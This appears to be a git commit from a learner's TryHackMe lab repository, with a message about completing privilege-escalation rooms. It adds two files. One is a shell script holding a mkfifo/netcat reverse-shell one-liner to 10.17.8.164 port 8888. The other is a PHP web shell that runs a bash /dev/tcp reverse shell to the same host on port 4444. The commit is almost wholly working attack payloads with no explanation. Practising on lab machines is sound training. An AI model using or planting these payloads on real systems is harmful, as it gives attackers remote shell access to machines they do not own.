2669e85ef86f6232f4a52fd421d7487f0c69c320
root <root@localhost.localdomain>
2021-06-06 19:30:32 +0530

    :v: Completed three rooms today Overpass3, Common linux privsec, Privilage escalation

---
+++ TryHackMe/CommonLinuxPrivesc/autoscript.sh
@@ -0,0 +1,1 @@
+mkfifo /tmp/lhxvrvi; nc 10.17.8.164 8888 0</tmp/lhxvrvi | /bin/sh >/tmp/lhxvrvi 2>&1; rm /tmp/lhxvrvi
---
+++ TryHackMe/Overpass/overpass3-Privilage-Escalation/web-shell.php
@@ -0,0 +1,2 @@
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.17.8.164/4444 0>&1'");
